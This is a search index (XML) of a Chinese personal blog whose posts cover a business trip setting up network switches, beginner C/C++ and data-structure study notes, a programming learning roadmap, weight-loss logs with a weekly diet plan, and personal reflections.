<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>第一次出差心得-02</title>
      <link href="/archives/27f29441.html"/>
      <url>/archives/27f29441.html</url>
      
        <content type="html"><![CDATA[<p>昨天定好的今天的行程是早晨去仓库进行组装测试，所以早晨7点半左右醒了，订了三个闹钟，盯着时间。11点钟，技术那边的人到了酒店，之后联系这边的负责人进行交接讨论，大约是1点左右讨论完成的，全程在听他们讨论组网的网段划分，二层三层交换机的区别，网关问题，怎么根据设备的情况划分网段，考虑到后期设备的增加，需要冗余网段和网口。以及设备的命名规则，交换机的堆叠方式（堆叠卡还是堆叠线），之后去玩边吃了饭，回来休息之后前往仓库进行测试，果然到了之后我预估的问题出现了，就是一个交换机我装了相同的电口，一个交换机装了相同的光口，并没有让两种板卡都配置到一个交换机上。</p><p>之后的3个小时，技术人员开始调试交换机，包括开启交换机，进行交换机的堆叠，堆叠其实就和串联一样，现在在万兆光口上进行级联，然后通过依次配置每台交换，让两天交换机可以是一台交换机的效果，除此之外，启动了另外两台千兆的接入交换机，一次进行级联，然后和交换机通过光纤连接成环路，形成环路是为了当中间节点断掉之后，能够保证两边的数据都可以进行传输。由于是三层交换机所以分配好ip之后，可以通过ping命令判断是不是可以远程连接其他交换机和核心交换机。</p><p>大体命令很多，光看是不能够完全的学会，期间我问了一些关于交换机的相关问题，虽然我对此并没有深入的研究。</p><p>他们计划会到酒店再进行脚本的编写，脚本写好之后，明天直接拿着脚本前往现场进行调试就行。我拿设备到达酒店之后变回到房间。</p><p>明天预计安排，7点左右起床，然后慢慢小睡，等那边的安排。预计明天两种方式：1、如果不需要我参与，我就退房，下午回济南。2、听说他们是明天退房那么我就直接退房，晚上会济南。</p><hr /><p>今天的心得体会：</p><ul><li>小公司对于人的要求就是，对自己有帮助的就是同事，不会花时间理会其他人员，虽然都是站在利益角度来看的，但是对于这种公司的做事流程的不规范，我还是很不喜欢，相互推诿，扯皮大于工作，从这两天的工作流程来看几乎没有成长，反而浪费了很多时间。</li><li>未来的两个月我自己的时间应该是安排很紧。如果不快快解决我自己毕业的问题，其他事情都需要往后稍稍。最多不能浪费两天以上的时间去做其他不相关的事情。</li><li>另一方面是关于技术的成长问题，其实对于技术人员来说我学到了一点就是应该多敲代码，熟练掌握代码的逻辑，熟练！！！！应该在书中的代码多敲一点，不管是C语言还是C++的代码，不应该是光看，画好逻辑图后，理解之后就去多敲多打，毕竟唬住人的良好的代码习惯和专业经验比较重要。</li><li>第三点就是关于学习四大件的心得，还是理解。可以采取第一遍速读，然后画图写要点，第二遍就是精读理解做笔记。</li><li>四大件：数据结构和算法、计算机网络、操作系统、设计模式</li><li>语言层面C语言、C++、linux中的shell。</li><li>学习要点就是：压缩语言的学习时间，语言的作用就是实现学习到的四大件，然后解决实际问题。要记住这一点。</li><li>语言的学习就是疯狂打代码，积累代码量，项目和刷题。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 生活随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第一次出差心得-01</title>
      <link href="/archives/befbc5fb.html"/>
      <url>/archives/befbc5fb.html</url>
      
        <content type="html"><![CDATA[<p>第一次出外地出差。</p><p>早晨8点起床，睡了不足6个小时，打车前往高铁站。一个小时的车程到达潍坊北站，来的相当早，打电话询问怎么前往需要去的地方。</p><p>又是打车到达酒店后开始休息，期间一直在沟通华三技术的工作人员什么时候到来，包括跟我舅联系，跟华三方面的人联系。客户这边以为我是过来的技术人员，所以让我搭建交换机堆叠然后进行交换机的测试，吃完午饭后前往仓库进行交换机的组装，到达仓库后，这边的负责人就走掉了，我这边进行交换机组装了很长时间，从板卡的 安装，电源的安装，其实很简单，我这边安装的比较慢。想要开始测试的时候，询问华三的那边的人开始有消息了，和这边客户沟通了技术人员的确定地点，然后我就不知道干什么了，一直等到这边负责人回来，看时间并没有时间进行服务器和交换机的连接测试了，问我是不是对交换机的型号不熟悉，我说我是知道的，因为我之前看了技术文档了，但是不知道怎么配置，我说明天技术人员会过来，明天可以进行调试，不知道他那边是什么情况，就开始闹脾气，感觉是我耽误了它的进程，从一开始服务器和交换机这边就没有安排好，我这边也其实没问清楚，说好的开会讨论，我这边来了就完全不知道，要做什么。回去的路上可能负责人对今天的事情做的好多都不满意，感觉很不耐烦，我没有对此进行回应，会到酒店静静等待明天技术人员的到来。</p><p>写了这么多的流水账，并没有找到自己的状态，一方面是自己来这里都是蒙的，很想找到一个模板或者有人教我怎么做，但是并没有；其二是我自己并没有调整好自己的状态，整天头疼和疲惫。到目前为止还是很难受。其实回到酒店之后感觉很委屈，本来是舅的事情，想来帮忙的，自己并不是这样的人员，就算是给我钱我都没有心动，但是来到之后，可能就是自己的想法和说话，让自己处于很尴尬的地步。更让我坚定了，一定要尽自己能力去做事情，不要跨度太大，不喜欢就是不喜欢，学好做事的态度。</p><p>从今天的开始状态来说</p><ul><li>首先我舅给我了联系方式，那就先自己联系看下别人是怎么安排的，按照自己的节奏安排行程，更舒服。</li><li>在外边做事，按照别人的安排做事，多交流沟通。</li><li>提前掌握好工作的流程尽量详细。我的问题就是没有提前问好工作流程，不要信去了现场再说，到了现场问题百出，没有问题就有鬼了。</li><li>应对客户的提问或者质疑没办法回答的情况下就先恢复说记录下来，咨询公司的专业人员，或者说文档中是这样写的。</li><li>面对客户抱怨，那就让他说，尽量保持不说话，慢慢引导转移话题，通常是工作一部分如果没有特别大的后果，其实长时间的交流沟通就会顺畅很多。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 生活随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C/C++初级工程师学习路线</title>
      <link href="/archives/867a622d.html"/>
      <url>/archives/867a622d.html</url>
      
        <content type="html"><![CDATA[<p>对于语言的学习，我已经拉长了很长时间的战线，从最终结果来看毫无作用，并且很多知识也已经忘了，今天搜到了codesheep关于学习路线的一些指导，感觉豁然开朗，虽然不知道对不对但是很合我的口味，就是那种说了就能让人能够信服的感觉，我现在整理下来。</p><ul><li><p>1.C语言</p><ul><li>除了学习基本的语法特性之外，需要掌握它最主要的部分就是指针和内存管理</li><li>书籍可以学习《C Primer Plus》、《C和指针》、《C专家编程》</li></ul></li><li><p>2.C++</p><ul><li>可以认为C++是C语言的延伸，增加了面向对象编程。包括封装继承多态、泛型编程、模板、STL等</li><li>《C++primer》、《Effective C++》、《C++标准程序库》、《STL源码剖析》、《深度探索C++对象模型》、《》、《》</li></ul></li></ul><hr /><center>语言学习一定要一鼓作气，强压力下学下来不然容易泄气</center><ul><li><p>3.编程四大件</p><ul><li>数据结构与算法：leetcode刷题、《剑指offer》、《C和C++程序员面试秘籍》</li><li>计算机网络：TCP/CP详解</li><li>操作系统：深入理解计算机系统</li><li>设计模式：不用要求你会使用所有的模式。《大话设计模式》</li></ul></li><li><p>4.应用实践编程</p><ul><li>学会linux</li><li>学会linux下的编译器</li><li>学会使用make和书写makefile</li><li>学会GDB调试器</li><li>后面的linux环境编程：系统编程、多线程编程、网络编程</li><li>《Unix环境高级编程》、《Linux高性能服务器编程》、《POSIX多线程程序设计》</li></ul></li></ul><hr /><p>在总结这篇博客的时候，看到了新的一篇文章，更让我眼前一亮，特别是作者的title，让人信服；</p><p><a href="https://www.zhihu.com/question/21671705/answer/1241926801" target="_blank" rel="noopener">https://www.zhihu.com/question/21671705/answer/1241926801</a></p><p>对找工作最有用的转行策略：</p><ul><li>学一门编程语言</li><li>掌握数据结构与算法</li><li>数据库技术，好入门。</li><li>掌握一种技能：<ul><li>服务器开发，尝试写一个通信软件之类的</li><li>云计算，用spark和hadoop尝试对大数据进行删改读写</li><li>AI，写一个推荐系统、搜索引擎、图形变化、语义理解的模型。</li></ul></li><li>自学成功的标志：可以定义为打开简历可以看到3-4个与计算机/编程相关的项目；或者拿来大公司的面试题，可以有解题思路。</li></ul><hr /><p>我现在还处于第一个阶段，学习一门语言。</p><p>虽然都是推荐java，但是我害怕没时间进行了，先从C语言+C++学起，因为自己比较熟悉这一部分，也愿意投入时间，掌握数据结构与算法，要和leetcode进行结合。</p><hr /><p>更新：2020-9-25</p><p>看到的一些“过来人”的关于后台开发学习和工作的经验：</p><ul><li><a href="https://www.cnblogs.com/xzxl/p/7779995.html" target="_blank" rel="noopener">后台开发之我见</a></li><li><a href="https://blog.csdn.net/linyacool/article/details/84560901" target="_blank" rel="noopener">C++后台开发学习路线</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>阶段性总结（2）</title>
      <link href="/archives/713d20ba.html"/>
      <url>/archives/713d20ba.html</url>
      
        <content type="html"><![CDATA[<p>永远年轻，永远热泪盈眶！也总有人年轻，也总有人泪眼盈眶，为什么我的年轻要经历这么多伤。</p><p>从小胖到大的过程中，没有人会批判你的身体，相反他们会安慰你“胖嘟嘟的多好看”。直到你长大，习惯了这种安慰，他们告诉你“你太胖了，要减肥啦”。后来我才明白原来长大会经历真理的更替，原本的一些是假象，跟有一些成为了笑话。</p><p>我很庆幸自己一直在成长，</p><p>我很感激有人会跟我说好事多磨，</p><p>我很期盼我的未来！</p><p>以前我知道总有人年轻，却不知道什么是年轻，青少年是年轻？外表清新是年轻？还是内心纯净是年轻？</p><p>但在某一个时间我意识到：我正年轻。</p><p>年轻就是不为外界教条束缚自己，为自己赢得世界尊重，就是跌倒之后起身还能甩甩头继续做自己。</p><p>当我意识到这一点的时候，突然生活就洒进了阳光。我内心在想我年轻的时候，如果不能做成一件不为讨好他人，只为取悦自己的事，那就是失败的人生。虽然我也不知道什么是成功，更别提失败，但总要做些什么。</p><p>为此我尝试了很多的事情，考研，找工作的目标，学英语等。</p><p>有些事我做到了，有些事尽管不停的尝试，还是有点乏善可陈。</p><p>最近的一个目标就是瘦身，为的纠正错误的自己，提高自己的自信，跟深层次为地球减负，做一个改变世界的人。</p><p>某一天我会自豪的说我改变了世界，哪怕改变了一点点。</p><hr /><p>今天是减肥的第二个阶段总结。</p><p>今早体重200斤，这周必下200斤，这是我对自己的承诺。</p><p>记录下这段时间的改变：</p><ul><li>1.采用了放纵日的概念，每周都有放纵日，这次是吃了烧烤和啤酒。</li><li>2.开始跟着keep开练，出汗量增加了，运动次数一天一练变为了一天二练，基本上是走跑结合+keep计划。</li><li>3.睡眠时间保证的很好，基本上一天睡眠时间6-8小时之间。</li></ul><p>还需要改进的地方：</p><ul><li>1.关于饮食。饮食这段时间会出现晚餐的高热量，甚至出现了暴饮暴食。</li><li>2.运动损伤。身体出现了伤痛，包括膝盖疼痛、脚踝疼痛、大腿韧带拉伤、足底筋膜炎。</li><li>3.减肥时间。为了达到目标，我出现了过度焦虑不，习惯性的花费大量时间来查询相关的资料，很多都是无用功，效率低下，已经严重影响了自己其他的计划，耽误了很多时间。</li></ul><p>改进方案：</p><ul><li>1.关于饮食。虽然我知道节食很不好，但是晚餐我可能得使用极端的方式-过午不食来改善下，慢慢降低自己在晚间的饮食需求。另外一种方式就是饿的时候大量喝水，给自己饱腹感，并冲淡胃液，降低胃部损伤。还有我发现中午吃的蔬菜过多了晚上就没了青菜储备，未来应该多准备点青菜分两顿解决，不要怕做饭麻烦。</li><li>2.关于运动损伤。一种方式就是设置休息日，休息一天让自己家身体恢复；一种方式就是在慢跑和快走之前，先进行半小时的减肥操让身体活动起来。减肥操我准备跟keep和搏击操进行替换训练。除此之外为了避免其他未知的损伤出现，需要购买一些护具，比如压缩裤和运动护膝（非用不可的时刻）、护腕（手踝脚踝）</li><li>3.关于时间的问题。我的时间管理能力比较差，能够想到的方式就是花费将近一天的时间提前做好计划，这一周就按照这个计划来，不再改动，重要的一点是需要设置未完成计划的补救方案。要求计划尽量详细，我会把每次的计划贴在博客上，计划制定之后每天按照计划来做，不再重新设置新的计划。</li></ul><hr /><p>未来10天目标向着190斤迈进。</p><p>相信自己，</p><p>GO！</p>]]></content>
      
      
      <categories>
          
          <category> 减肥之路 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>阶段性总结（1）</title>
      <link href="/archives/63888f54.html"/>
      <url>/archives/63888f54.html</url>
      
        <content type="html"><![CDATA[<p>减肥本就是循序渐进的过程，都说好事多磨，这也许就是一件吧。</p><p><strong>计划每十天就做一次总结</strong></p><p>10天前，我开始认真执行减肥计划，虽然不是新手了，但是换了环境以后，很难执行原先的计划。几乎所有的新手开始都会打着减肥的号子，抱着必瘦的决心，去开始节食减肥，就算是去健身房的那批人也会不由自主的过度节食，起初我也是这样。这样的效果就是可以快速变瘦，让我享受成为瘦子的喜悦，后果也很明显，就是很难形成良好的习惯，最终导致自己重回体重巅峰。所以这次我要变得清醒点，给自己明确了目标：不再复胖，一要养成可以形成习惯的运动方案，二要有一个可以长期执行的饮食计划。</p><p>到今天过去十天了，我尝试七天减肥食谱，前四天完成的很好，最后三天的计划没有完成；采取的运动是每天快走，有效运动时间在30-45分钟之间，运动强度在可承受范围内。</p><p><strong>最终我的是体重由原来的208斤减到了204斤，初有成效！</strong></p><hr /><p>需要改进的地方：</p><ul><li>1.过度放纵自己。这十天除了吃食谱上的菜，还有海吃了自助餐，和朋友吃了麻辣小龙虾，期间也喝了奶茶、饮料。</li><li>2.晚饭超量。有时候晚餐吃的热量和油脂比较多。</li><li>3.运动强度很轻。快走就算是一个小时也不出很出汗。</li><li>4.睡眠不好。倒班倒的没有规律，每次睡眠 3、4个小时。白天早晨的时间用来补觉了。</li></ul><p>改进方案：</p><ul><li>1.还是得给自己设置放纵日，每周一天的放纵日，放纵晚记录下来标红，提醒自己这周没有放纵机会了。</li><li>2.晚饭先计划吃水煮青菜+水果来解决，量大热量少，还能补充维C。</li><li>3.更改计划：自重训练+有氧运动，时间1:1.5，快走和慢跑交替。</li><li>4.睡眠问题。保证7到7个半时的睡眠，更改运动的时间为晚上6点左右开始。</li></ul><hr /><p>未来10天的关键点是控制晚餐和睡眠，看看10天之后有什么效果吧！</p>]]></content>
      
      
      <categories>
          
          <category> 减肥之路 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C++之引用</title>
      <link href="/archives/72f72ceb.html"/>
      <url>/archives/72f72ceb.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> C++系列学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C到C++还有哪些升级</title>
      <link href="/archives/26a73c29.html"/>
      <url>/archives/26a73c29.html</url>
      
        <content type="html"><![CDATA[<p><strong>1、新增类型之bool类型</strong></p><p>布尔类型是C++新增的基础类型。利用关键字true和false来表示真值和非真值。但是在实际处理中，是利用整数类型来表示，占用一个字节。也就是真为1非真为0，任何非0的值都是别人定为真，为0则为假。这样说有点绕，用代码更清晰。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> a = <span class="literal">false</span>;           <span class="comment">//编译器在编译中就会将a用一个字节的整数0来存储</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> b = <span class="number">-2</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">a = b;                        <span class="comment">//将b赋值给a，那么a就变为了-2非0值，那么编译器就会将a处理为1来保存，</span></span></pre></td></tr></table></figure><p>bool类型是可以进行运算的，运算的结果在编译器的处理下只有两个整数值，0和1。或者说true和false</p><p><strong>2、C++中三目运算符</strong></p><p>在C语言中三目运算符是不能作为左值，C++中可以。</p><p>原因在于C语言中三目运算符返回的是值，而不是具体的变量，这是不能作为左值使用的；在C++中只要可能的返回都是变量时，那么返回的是引用而不是具体的值，引用在C++中就是某一变量的别名，可以作为左值使用。</p><p><strong>3、新增引用–变量的别名</strong></p><p>引用是已经定义的变量的别名，因此引用的类型和变量类型相同，并且必须定义初始化。&amp;</p><p>由于引用是别名，那么可以对原变量的存储空间进行操作。</p><p>C++中，关于引用的底层实现其实是指针，可以引用一段内存空间，但是注意引用不是对象。</p>]]></content>
      
      
      <categories>
          
          <category> C++系列学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>const关键字</title>
      <link href="/archives/49f01bdb.html"/>
      <url>/archives/49f01bdb.html</url>
      
        <content type="html"><![CDATA[<p>学过C语言首先一个问题就是C语言能不能定义常量？</p><p>可能首先想到的就是通过const关键字来定义常量，或者说是enum枚举类型来定义常量。但是我们通过指针可以更改const修饰的常量，是因为C语言在遇到const修饰的常量会分配存储空间，也就允许了在制定存储位置被修改。那么就做不到从根本上定义常量。</p><p>在C++中是不是也有这样的，不是。</p><p>C++中虽然也是可能为const常量分配存储空间，但是不使用存储空间中的值，它使用的是编译过程中产生的符号表。在编译过程中当遇到extern修饰const变量也就是修饰全局变量和使用&amp;取地址符时候，就会开辟一段新的存储空间和C语言一样。而具体使用的时候就是直接查询静态编译中提前存储的值，就不会在运行时被指针修改。</p><p>区别：</p><ul><li>C语言中const变量只是只读变量，会分配存储空间</li><li>C++中可能分配存储空间，到那时不一定使用其中的值。</li></ul><p><strong>const常量和宏定义的区别</strong></p><ul><li>宏定义是被预编译器处理的，只是简单的文本替换</li><li>const常量是被编译器处理的，编译器会进行类型检查和作用域检查。</li><li>也就是说在使用过程中const常量是有作用域范围的，而宏定义是在全局范围内都可以进行文本替换。</li></ul>]]></content>
      
      
      <categories>
          
          <category> C++系列学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>掌握一门语言之c++</title>
      <link href="/archives/e3bfd105.html"/>
      <url>/archives/e3bfd105.html</url>
      
        <content type="html"><![CDATA[<p><strong>从C语言到C++语言</strong></p><p>从面对过程开发到面对对象开发，从直接分析问题，直接设计解决问题的函数进行分步解决问题，到用模拟现实世界的方法来描述解决问题的方法。C++语言是从C语言+面对对象特性发展来的，是C语言的继承。高效的面对对象语言，并且能够兼容以前的代码这就是C++语言的诞生的优势。<br />存在就有价值，那我到底为什么学习C++呢，明明利用Python中的各种库可以很好的玩耍，我说服自己或者说学习C++根本就不用说服自己的原因：</p><p><strong>为什么非要学习C++语言？</strong></p><ul><li><p>1、可以说C++语言是作为一些语言（特别是面对对象）的学习基础，涉及到语言的设计方法和学习思路，都是可以作为启发来学习其他语言；</p></li><li><p>2、解决更多的问题，也就是学习C++更为在后来的成长路线上走捷径。虽然学好C++的成本很高，但是在大部分的领域可以做到一劳永逸。</p></li><li><p>3、现代软件的设计过程或者是开发过程，可能是用不同语言来编写的，对于现代软件的要求包括需要能更灵活的添加修改来适应用户不同的需求、具有更好的移植性，降低新软件的开发成本、还需要更方便的部署和更新。这些特性我还没有真正理解C++的优势是什么，但是还是觉得现代软件的设计语言中C++的功能多并且运行比较高效。</p></li><li><p>4、最重要就是以前面试的时候被问:你会C++吗？我说会；然后做过什么项目？我答无，然后面试就无了。</p></li></ul><p>既然要好好学习C++语言，不光是需要学习好语言的特性，还要掌握和其他的语言的关系，力求在软件开发中可以为自己提供更多解决方案。首先来说C++是C语言的继承那么就肯定有很多的升级，对于C语言和C++语言一族来说，继承又有哪些升级呢。</p><p><strong>C语言到C++的升级</strong></p><ul><li>首先最重要的升级第一点是类型的加强，C语言开发中变量的定义必须要在作用于前进行定义，否则就不知道变量在哪，而对于C++来说可以在使用时进行定义，更为灵活，开发效率更高；还比如对于C语言中默认类型f()和int f(void)之类的使用C++中就不能使用，是为了避免二义性。</li><li>第二点的加强就是面对对象设计思想的加强，之所以说是加强，是因为C++中集成了面对对象设计的语法。</li><li>C++更强调实用性，之前说定义变量的不同就是这样，并且举个例子对于register关键字的使用，在C语言中就是会声明定义到变量存到寄存器中，是没办法取到该变量的地址的，但是C++的编译器就对此进行了优化，所以用不用那个关键字都没啥用。在编译时需要存到寄存器中的变量可以自动优化到里面，并且可以取地址。</li><li>二义性，C++对于类型的检查非常严格，不允许二义性，C语言中可能存在可以在不同位置定义全局变量，但是在C++中是不被允许的。C++中你可以多次声明变量，但是不允许你多次定义。</li><li>struct关键字的使用。C语言中struct是代表多数据类型的集合，不能称之为新类型，如果像作为新类型使用必须使用typedef关键字来修饰，而C++中，struct关键字可以作为一种新类型来定义对象。</li><li>前面提到的默认函数类型，C语言中如果没有定义函数的返回类型和参数类型，都会默认为 int类型，但是来强类型语言的C++中，这种操作就只能活在梦里，不告诉他类型是不行的。是不是更为严谨了。</li><li>编译器优化问题。由于解决问题的代码多样性，不同的程序运行效率都是不同的，为了有更好的运行效率，就需要语言本身对于代码进行优化，由于C++语言特性比较多，使用场景也更广，所以C++编译器的优化必定是强于C语言的。</li></ul>]]></content>
      
      
      <categories>
          
          <category> C++系列学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>7天减肥食谱</title>
      <link href="/archives/1c62288a.html"/>
      <url>/archives/1c62288a.html</url>
      
        <content type="html"><![CDATA[<center>一周减脂食谱：肉蛋奶+果蔬+粗粮</center><blockquote><p>现在试试7天食谱+运动会瘦几斤，胖子买裤子是最难的了！！！</p></blockquote><h4 id="周一"><a class="markdownIt-Anchor" href="#周一"></a> 周一</h4><ul><li>早：<ul><li>全麦吐司1片</li><li>牛奶1杯</li><li>苹果1个</li></ul></li><li>中：<ul><li>芹菜粥；其中芹菜100g+大米100g+小米100g</li></ul></li><li>晚：<ul><li>生菜沙拉；使用油醋汁</li><li>油醋汁配比：香油:醋:蜂蜜（可有可无）:酱油=2:1:1:1,需要黑胡椒或者蒜泥+芝麻或者芝麻酱，搅拌均匀并冷藏。</li><li>生菜+西红柿+黄瓜+洋葱+苦菊+紫蓝+鸡蛋+红萝卜等</li></ul></li></ul><h4 id="周二"><a class="markdownIt-Anchor" href="#周二"></a> 周二</h4><ul><li>早：<ul><li>全麦吐司2片</li><li>酸奶1杯</li><li>葡萄干10个或者用其他代替</li></ul></li><li>中：<ul><li>杂蔬鸡胸肉</li><li>做法：一碗鸡胸肉切丁+淀粉+盐+耗油+生抽+姜丝，基本是1:1比例，抓匀腌制15min，然后送到锅里面进行翻炒最后加入杂蔬（玉米+青豆+胡萝卜切成丁）</li></ul></li><li>晚：<ul><li>水蒸蛋：香菇+姜末</li></ul></li></ul><h4 id="周三"><a class="markdownIt-Anchor" href="#周三"></a> 周三</h4><ul><li>早：<ul><li>酸奶1杯</li><li>水煮蛋2个</li></ul></li><li>中；<ul><li>红豆薏米粥或者黑米粥450g</li></ul></li><li>晚：<ul><li>苹果1个</li><li>坚果15g</li></ul></li></ul><h4 id="周四"><a class="markdownIt-Anchor" href="#周四"></a> 周四</h4><ul><li>早：<ul><li>红薯粥：450g</li></ul></li><li>中：<ul><li>手撕鸡胸肉或者是杂蔬鸡胸肉</li><li>凉拌黄瓜</li></ul></li><li>晚：<ul><li>橙子/苹果1个</li><li>葡萄干或其他</li></ul></li></ul><h4 id="周五"><a class="markdownIt-Anchor" href="#周五"></a> 周五</h4><ul><li>早：<ul><li>燕麦泡牛奶300g</li></ul></li><li>中：<ul><li>素菜沙拉同周一</li></ul></li><li>晚：<ul><li>水蒸蛋1份</li></ul></li></ul><h4 id="周六"><a class="markdownIt-Anchor" href="#周六"></a> 周六</h4><ul><li>早：<ul><li>全麦吐司面包2片</li><li>水煮蛋1个</li></ul></li><li>中：<ul><li>杂蔬鸡胸肉</li></ul></li><li>晚：<ul><li>小番茄10个</li><li>坚果15g</li></ul></li></ul><h4 id="周天"><a class="markdownIt-Anchor" href="#周天"></a> 周天</h4><ul><li>早：<ul><li>三明治1个</li><li>牛奶1杯</li></ul></li><li>中：<ul><li>土豆泥</li><li>水煮蛋2个</li></ul></li><li>晚：<ul><li>水果沙拉1份，根据自己心情来买。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 减肥之路 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>追寻偶像是一种精神追随吗？</title>
      <link href="/archives/19c7f8c2.html"/>
      <url>/archives/19c7f8c2.html</url>
      
        <content type="html"><![CDATA[<p>乐队的夏天邀请到了新裤子，很激动能不去现场就能听到多首他们的歌曲，不仅如此，节目的氛围还能让人嗨起来。《没有理想的人不伤心》是我听新裤子的第一首歌，一见钟情，恋爱也不过如此，何况听歌还可以移情别恋，喜欢的没有道理可言。那是在2017年的考研期间，习惯听歌学习，听李建、赵雷、薛之谦，是奔着他们的歌词；听纯音乐，是为了他们的旋律。正好新裤子的这首歌同李健的《异乡人》一样，听到歌词就能引起共鸣，在异乡一个人，不知为什么坚持。学生就是喜欢感伤，我天生的“自卑”心理，更是增添几道伤疤在心口，那时候我开始思考，我的精神内核是什么，或者说是精神追求。</p><p>如果问我追求是什么，我肯定首先想到的是拥有健康的身体，漂亮的老婆，温馨的家庭，富裕的生活，这些都是物质的，哪能支持达到这些目标的力量就说不上来了。喜欢的NBA球星都有自己的偶像，譬如年轻一代的球星喜欢科比，钟爱其曼巴精神，喜欢那句名言“你知道凌晨四点的，洛杉矶吗？我知道！”，为了冠军目标他们找到科比来为自己加油鼓起。我却不知道什么是偶像？我的偶像是谁？有些话得掏心窝子说，我自己展开看看心中装的是什么</p>]]></content>
      
      
      <categories>
          
          <category> 生活随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法精解：C语言描述（二）</title>
      <link href="/archives/9f68689e.html"/>
      <url>/archives/9f68689e.html</url>
      
        <content type="html"><![CDATA[<p>理解栈这种结构可以那他的应用记录函数调用的数据块来说，当发生函数调用时，用栈记录下调用信息，直到该函数执行完成之后进行返回，这样看来函数调用和函数的返回是一个相反的过程。</p><p>理解队列，也可以举例有的类型数据的使用需要按照先后优先顺序，队列就可以完成存储具有先后使用顺序的数据。</p><p>应用：</p><ul><li>信号量</li><li>事件处理</li><li>X Windows系统</li><li>生产者-消费者问题</li><li>C中的函数调用</li></ul><h3 id="栈"><a class="markdownIt-Anchor" href="#栈"></a> 栈</h3><p>特点：先进后出，删除从后进入栈的数据开始。</p><p>关于栈的实现和接口定义，用链表来实现栈，由于本身栈就是链表来实现的所以很多接口定义可以直接使用链表的操作；</p><h3 id="队列"><a class="markdownIt-Anchor" href="#队列"></a> 队列</h3><p>特点是：先进先出；</p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法精解：C语言描述（一）</title>
      <link href="/archives/af7e8446.html"/>
      <url>/archives/af7e8446.html</url>
      
        <content type="html"><![CDATA[<p>链表：是一种数据结构类型。链表元素在内存中的存储位置不是连续的，且动态分配内存，元素之间通过指针链接。</p><p>链表的形式有单链表、双链表、循环链表。下面分别记录下每种形式和他们之间的区别</p><h3 id="单链表"><a class="markdownIt-Anchor" href="#单链表"></a> 单链表</h3><p>对于单链表，链表元素包括数据域和指针域，元素之间通过next指针链接。</p><p>其相关的接口定义包括初始化list_init、销毁list_destroy、插入list_ins_next、删除操作list_rem_next。</p><p>应用之一：页帧管理。</p><h3 id="双链表"><a class="markdownIt-Anchor" href="#双链表"></a> 双链表</h3><p>双向链表对于单链表来说，不同在于提供了反向遍历操作，含有前向指针prev、后向指针next;</p><p>接口和单链表相似。</p><h3 id="循环链表"><a class="markdownIt-Anchor" href="#循环链表"></a> 循环链表</h3><p>循环链表是一种链表形式，可以是单向也可以是双向，特殊的地方在于其尾指针不是指向NULL,而是指向头元素。</p><p>接口定义和上述相似。</p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年总结</title>
      <link href="/archives/154a8569.html"/>
      <url>/archives/154a8569.html</url>
      
        <content type="html"><![CDATA[<p>怎么样开始写东西呢，以前有时间会写点笔记，现在想写点东西就是写不出来，说白了就是写的东西没有逻辑性，别人怎么会看呢。</p><p>今天找了解决的方法，心情浮躁的时候是没有逻辑可言的，全凭主观印象去做事，当心情安定下来后，思考东西更为全面，这时把所思所想记录下来，将文字输入到大脑中，分析具体的文字，解决问题就更有效。</p><p>那些你起早努力的日子，那些熬夜努力的时光，那些你太累觉得再也站不起来，却依支撑自己起身的夜晚，那才是梦想的力量。</p><p>---------科比</p><p>我不想去谈论那些不合适的人，我们彼此根本不懂对方，也不想去了解。</p><p>如果你害怕失败，就意味着你已经输了。</p><p>水是无形的，如果你将水倒进了被子里，他就变成杯子的形状，你将水放入到瓶子，它就变成瓶子的形状，水可以柔软的流动，也可以坚硬的凝结，像水一样，我的朋友。</p><p>--------李小龙，学会适应。</p><p>没有信仰的人是没有灵魂的空壳，</p><p>人最希望获得建议还是获得支持？</p><p>首先我认为没有绝对完美的决定，经过深思熟虑之后决定有好有坏，将负面效应降低到最小，却仍然不是最好的决定，你会选择获得别人的支持还是祈求得到建议进行改正。</p><p>明知道不会变的更好的前提下，你是否还会坚持去做。我们考虑一切的时候，都不会准确站在对方的角度去思考，这使得提出的建议和思考局域局限性，就好比是橘生淮北则为枳，脱离适宜环境下主观意愿都会成为影响他人决定的因素。</p><p>虽然不应该完全采纳，那怎么能够接受对自己好却难以实施的意见，三人行必有我师，取其精华去其糟粕，以史为鉴。这些道理无一不说明，听取他人建议的重要性，但是所有的一切都是建立在有多种解决方案的基础上，多种解决方案进行比较，采用最理想的方法。如果不是这个样子，就要做事果断，不要犹豫。</p><p>还有重要的一点，不要盲目的下决定或者追风，不了解事情的全貌，只凭主观看法去做事，可能取得意想不到的效果，但是并不是其他任务的做事标准。</p><p>认清自己是理工科的思维和逻辑，学会判断，即有果必有因，最大程度还原事情的本相，会帮助自己做判断。</p>]]></content>
      
      
